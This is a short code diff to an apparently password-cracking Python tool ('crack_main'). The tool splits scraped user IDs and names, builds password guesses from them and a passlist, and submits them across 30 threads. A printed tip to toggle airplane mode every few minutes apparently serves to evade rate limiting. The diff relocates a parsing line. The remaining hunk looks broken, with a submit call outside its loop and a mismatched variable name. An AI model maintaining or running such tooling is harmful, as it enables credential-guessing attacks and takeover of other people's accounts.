@@ -409,6 +409,7 @@ class crack_main():
                 with ThreadPool(max_workers=30) as formSubmit:
                         total = str(len(self.id))
                         for user in self.id:
+                                iid,names = user.split('|')
                                 first_name = names.rsplit(' ')[0]
                                 try:
                                         last_name = names.rsplit(' ')[1]
@@ -424,7 +425,6 @@ class crack_main():
                 print(' After Every 5 Min Turn Airplane On/Off')
                 print(50*'=')
                 with ThreadPool(max_workers=30) as formSubmit:
-                                iid,names = user.split('|')
                                 formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
